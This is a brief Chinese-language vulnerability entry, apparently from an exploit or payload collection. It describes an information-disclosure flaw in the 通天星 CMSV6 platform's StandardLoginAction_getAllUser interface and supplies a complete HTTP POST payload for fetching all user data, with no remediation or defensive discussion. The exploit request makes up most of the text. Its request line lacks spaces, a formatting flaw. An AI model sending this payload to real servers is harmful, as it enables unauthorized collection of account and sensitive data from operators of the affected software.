**漏洞描述：**

通天星CMSV6接口StandardLoginAction_getAllUser存在信息泄露，攻击者可以通过访问接口非法获取敏感信息。

**影响版本：**

通天星CMSV6

**Payload：**

```
POST/808gps/StandardLoginAction_getAllUser.actionHTTP/1.1
Host: host
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection:close
Content-Length:9
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding:gzip, deflate

json=null
```

---
